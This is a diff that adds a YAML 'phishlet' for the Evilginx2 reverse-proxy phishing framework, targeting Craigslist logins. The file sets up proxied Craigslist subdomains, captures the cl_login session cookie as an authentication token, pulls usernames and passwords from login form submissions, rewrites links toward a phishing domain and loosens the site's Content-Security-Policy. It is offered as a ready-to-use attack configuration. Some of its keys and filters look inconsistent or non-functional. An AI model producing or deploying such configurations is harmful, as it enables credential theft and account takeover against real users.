@@ -1,0 +1,87 @@
+# Craigslist Phishlet for Evilginx2 v3.3.0
+name: Craigslist
+author: Anon369G
+min_ver: "3.0.0"
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'craigslist.org', session: true, is_landing: true}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'craigslist.org', session: true, is_landing: false}
+  - {phish_sub: 'region', orig_sub: '*', domain: 'craigslist.org', session: true, is_landing: false}
+  - {phish_sub: 'post', orig_sub: 'post', domain: 'craigslist.org', session: true, is_landing: false}
+sub_filters:
+  - domain: 'craigslist.org'
+    filters:
+      - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://{hostname}/login/home', replace: 'https://{hostname}/login/home', mimes: ['text/html', 'application/json', 'application/javascript']}
+      - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://{hostname}/login', replace: 'https://{hostname}/login', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  cookies:
+    - name: 'cl_b'
+      domain: 'craigslist.org'
+      is_auth_token: false
+    - name: 'cl_def_hp'
+      domain: 'craigslist.org'
+      is_auth_token: false
+    - name: 'cl_login'
+      domain: 'accounts.craigslist.org'
+      is_auth_token: true
+    - name: 'cl_session'
+      domain: 'accounts.craigslist.org'
+      is_auth_token: false
+  headers:
+    - name: 'User-Agent'         # Forward the original user-agent
+      is_auth_token: false
+    - name: 'Accept-Language'    # Forward the accept-language header
+      is_auth_token: false
+    - name: 'Referer'            # Forward the referer to maintain browsing context
+      is_auth_token: false
+    - name: 'Sec-Fetch-Site'     # Forward security fetch headers
+      is_auth_token: false
+    - name: 'Sec-Fetch-Mode'     # Forward fetch mode header
+      is_auth_token: false
+    - name: 'Sec-Fetch-Dest'     # Forward fetch destination header
+      is_auth_token: false
+    - name: 'Accept-Encoding'    # Forward the accepted encoding
+      is_auth_token: false
+    - name: 'Sec-Ch-Ua'          # Foward
+      is_auth_token: false
+
+credentials:
+  username:
+    key: 'inputEmailHandle'
+    search: 'post_body'
+  password:
+    key: 'inputPassword'
+    search: 'post_body'
+
+rewrite_rules:
+  - type: 'url'
+    source: 'https://www.craigslist.org'
+    destination: 'https://www.{phish_sub}.{phish_domain}'
+  - type: 'url'
+    source: 'https://accounts.craigslist.org'
+    destination: 'https://accounts.{phish_sub}.{phish_domain}'
+  - type: 'url'
+    source: 'https://*.craigslist.org'
+    destination: 'https://{phish_sub}.{phish_domain}'
+  - type: 'header'
+    source: 'Content-Security-Policy'
+    destination: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
+  - type: 'form'
+    source: 'https://accounts.craigslist.org/login'
+    destination: 'https://accounts.{phish_sub}.{phish_domain}/login'
+
+match_rules:
+  domain_match:
+    - 'craigslist.org'
+    - 'accounts.craigslist.org'
+  path_match:
+    - '/login'
+    - '/post'
+
+session_handling:
+  session_lifetime: 3600              # Time in seconds for session expiry
+  session_cookie: 'cl_session'        # Session tracking cookie
+
+logging:
+  enabled: true                       # Enable logging for phishlet
+  level: 'info'                      # Log level (info, debug, warn, error)
